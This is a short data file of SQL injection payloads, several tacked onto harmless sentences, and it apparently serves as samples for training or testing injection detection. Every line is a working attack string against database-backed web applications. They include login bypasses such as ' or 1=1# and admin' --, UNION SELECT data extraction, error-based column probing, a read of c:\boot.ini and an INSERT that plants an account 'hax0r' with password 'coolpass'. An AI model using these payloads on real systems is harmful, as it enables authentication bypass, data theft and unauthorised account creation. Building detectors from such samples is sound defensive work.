admin' --
' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
He turned in the research paper on Friday; otherwise, he would have not passed the class') or ('1'='1--
They got there early, and they got really good seats' or 1=1#
I want' SELECT header FROM news UNION ALL SELECT name COLLATE 
SELECT CONCAT('0x',HEX('c:\\boot.ini'))
The waves were crashing on the shore; it was a lovely sight' GROUP BY table.columnfromerror1 HAVING 1=1 --
Malls are great places to shop; I can find everything I need under one roof' union select sum(columntofind) from users--
Please wait outside of the house'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/*
SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--
Where do random thoughts come from?';--
